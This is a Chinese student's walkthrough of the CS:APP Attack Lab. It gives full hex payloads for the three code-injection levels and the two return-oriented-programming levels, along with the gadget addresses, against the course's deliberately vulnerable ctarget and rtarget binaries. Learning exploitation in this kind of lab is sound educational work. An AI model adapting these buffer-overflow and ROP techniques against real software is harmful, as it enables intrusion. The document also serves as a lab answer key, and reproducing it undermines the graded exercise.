## Attack Lab

---

Attack Lab食用方法：

- 请仔细阅读attacklab的讲义和CSAPP 3.10.3与3.10.4的内容

- 我食用的是target1，是否存在其他版本仍未知。

- 按如下输入进行测试

  > -h: Print list of possible command line arguments
  >
  > -q: Don't send results to the grading server
  >
  > - 如果不加这个就会出现FAILED
  >
  > -i FILE: Supply input from a file, rather than from standard input.

- hex2raw

  - hex2raw的输入为多个由空格隔开的2位16进制数(不加0x, 小于0x10要补0)
  - 将1.txt经过hex2raw转换后写入2.txt的命令: ./hex2raw <1.txt> 2.txt

- 评分规则

  - ctarget的3个level分别为10，25，25
  - rtarget的2个level分别为35，5

---

C: [level1](#t1)    [level2](#t2)    [level3](#t3) 

R: [level1](#r1)    [level2](#r2)

> ​		每个level都需要进入对应touch函数，并完成一些任务

### <span id = "c">CTARGET</span>

<span id = "t1">[**level1**](#c)</span>

- 根据讲义，我们查看getbuf()，test()和touch1()函数。任务如下:

  >  		test()调用getbuf()，通过其中的Gets(buf)使buf获得的字符造成缓冲区溢出，从getbuf()的ret进入touch1()

  - 需要的信息
    1. buf的长度，即BUFFER_SIZE的数值
    2. touch1的起始地址(之后不再提及该条)
    3. buf的起始地址
  - 从汇编代码中可以看到，Gets(buf)传入的参数%rdi = %rsp，在Gets(buf)开始时，%rsp -= 0x28，因此知BUFFER_SIZE= 0x28 = 40，buf的起始地址为%rsp
  - 我们需要返回的地址是%rsp + 0x28开始的8个字节，因此要先输入任意40个字节，然后输入touch1的起始地址，根据电脑储存方式差异会有所不同(大多数电脑都是little endian)
  - 答案如下(使用 ***hex2raw*** 转换后才是答案, 下同理)

  ```assembly
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  c0 17 40 00 00 00 00 00		#返回地址: $0x4017c0
  ```

<span id = "t2">[**level2**](#c)</span>

- 根据touch2中的信息，得知该level的任务是使%rdi == cookie，其中cookie的值已经给定于cookie.txt中，因此要想办法改变%rdi，但已知的几个函数都不能做到这一步

- 目前的输入可以改变栈中一定范围的内容。我们可以考虑在其中注入代码，然后跳转到这段代码的起始地址，从而改变%rdi，然后进入touch2

- 需要的信息

  1. %rsp和cookie(in cookie.txt)

  2. 改变%rdi值对应的机器代码

- 对于2，可以写出其汇编(.s文件)，然后转为.o文件，再用objdump转为.d文件(讲义appendix B的内容)

  ```assembly
  movq $0x59b997fa, %rdi
  pushq $0x4017ec
  ret
  ```

- 答案如下

  ```assembly
  0x5561dc78:	 48 c7 c7 fa 97 b9 59 68
  			ec 17 40 00 c3 00 00 00		#上一个代码块的内容
  			00 00 00 00 00 00 00 00
  			00 00 00 00 00 00 00 00
  			00 00 00 00 00 00 00 00
  			78 dc 61 55 00 00 00 00
  ```

<span id = "t3">[**level3**](#c)</span>

- touch3调用hexmatch()，cookie==val时通过
  - 我没明白s = cbuf + random() % 100的作用
- 可以使用man ascii获取ascii表
- 注意到hexmatch起始地址开始有三条pushq指令，因此输入的字符串的位置不能在touch3起始地址下，考虑放置在test的栈帧中
- 答案如下

```assembly
0x5561dc78:	48 c7 c7 a8 dc 61 55 68		movq	$0x5561cda8, %rdi
            fa 18 40 00 c3 00 00 00		pushq	0x4018fa
            00 00 00 00 00 00 00 00		ret
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            78 dc 61 55 00 00 00 00		#ret 
0x5561dca8: 35 39 62 39 39 37 66 61		
            00 00 00 00 00 00 00 00		#末尾的'\0'
```

---

### RTARGET

> ​		实际上，正常的程序都会使用栈随机化并设置非执行区域的吧。

<span id = "r1">[level1](#c)</span>

- gadget是什么？

  - 一段程序中的代码，其中的一部分与某条指令相同，并以0xc3(ret instruction)结尾。

  > 0x10: 11 22 33 48 89 c7
  >
  > 0x16: c3
  >
  > 从0x13开始是48 89 c7， 即movq    %rax, %rdi

  - 将多个gadget的地址连续存在栈中，可以使其顺序执行(每次ret都会进入下一个gadget，连续地址即可)
  - 这样就没有执行任何栈中的内容，只是读取其地址并跳转，从而规避nonexecuting(ret都在gadget中)

- 这题要利用gadget，可用的gadget都在farm.c中，Figure3给出了辨认gadget的方法。注意farm.c中有些函数中并没有可辨认的gadget。

- 答案如下

  ```assembly
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00	#惯例，填充40字节
  ab 19 40 00 00 00 00 00	#gadget popq %rax, addval_219和getval_480都可以
  fa 97 b9 59 00 00 00 00	#cookie, to be popped into rax
  a2 19 40 00 00 00 00 00	#gadget %rdi = %rax, setval_426和addval_273都可以
  ec 17 40 00 00 00 00 00	#enter touch2
  ```

  

<span id = "r2">[level2](#c)</span>

- Figure中对应的gadget在最下方
- 由于栈随机化，我们没有办法得到所需字符串的具体地址，因此考虑使用相对寻址，其中bias需要使用popq rax获得(唯一获得任意常数的可用指令)，然后使用add_xy，因此还要使rdi = rsp，rsi = bias
- bias的值在其余指令编写完后计算得到，为0x48

- 答案如下

```assembly
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	#填充buffer
ad 1a 40 00 00 00 00 00	#rax = rsp
c5 19 40 00 00 00 00 00	#rdi = rax, 因为上行ret至0x401aad, 因此rsp在该行起始处, 即rdi的值(基地址)
ab 19 40 00 00 00 00 00	#popq rax, rax = bias
48 00 00 00 00 00 00 00	#bias
dd 19 40 00 00 00 00 00	#edx = eax
69 1a 40 00 00 00 00 00	#ecx = edx
13 1a 40 00 00 00 00 00	#esi = ecx
d6 19 40 00 00 00 00 00	#rax = rdi + rsi
c5 19 40 00 00 00 00 00	#rdi = rax
fa 18 40 00 00 00 00 00	#enter touch3
35 39 62 39 39 37 66 61	#cookie, 9行共72 bytes, 因此bias为0x48
00 00 00 00 00 00 00 00	
```

- gadget如下

```c
/*
	popq rax
	rdi = rax, ecx = edx, edx = eax
	rax = rsp, eax = esp, esi = ecx
	x+y
*/ 
unsigned addval_273(unsigned x)
{
    return x + 3284633928U;	//rdi = rax, 0x4019a2
}

unsigned addval_219(unsigned x)
{
    return x + 2421715793U;	//popq rax, 0x4019ab
}

void setval_426(unsigned *p)
{
    *p = 2428995912U;	//rdi = rax, 0x4019c5
}

unsigned getval_280()
{
    return 3281016873U;	//popq %rax, 0x4019cc
}

/* This function marks the middle of the farm */
int mid_farm()
{
    return 1;
}

/* Add two arguments */
long add_xy(long x, long y)
{
    return x+y;//leaq (rdi, rsi, 1), rax, 0x4019d6
}

unsigned getval_481()
{
    return 2428668252U;	//edx = eax, 0x4019dd
}

unsigned addval_190(unsigned x)
{
    return x + 3767093313U;//rax = rsp, 0x401a06
}

unsigned addval_436(unsigned x)
{
    return x + 2425409161U;//esi = ecx, 0x401a13
}

unsigned addval_187(unsigned x)
{
    return x + 3224948361U;//esi = ecx, 0x401a27
}

unsigned getval_159()
{
    return 3375944073U;//ecx = edx, 0x401a34
}

unsigned addval_110(unsigned x)
{
    return x + 3286272456U;//eax = esp, 0x401a3c
}

unsigned addval_487(unsigned x)
{
    return x + 3229926025U;//edx = eax, 0x401a42
}

unsigned getval_311()
{
    return 3674788233U;//ecx = edx, 0x401a69
}

unsigned addval_358(unsigned x)
{
    return x + 2430634248U;//eax = esp, 0x401a86
}

void setval_350(unsigned *p)
{
    *p = 2430634312U;//rax = rsp, 0x401aad
}
```

---

完结撒花！

其实看懂了真的不难的，而且很有意思，嘿嘿。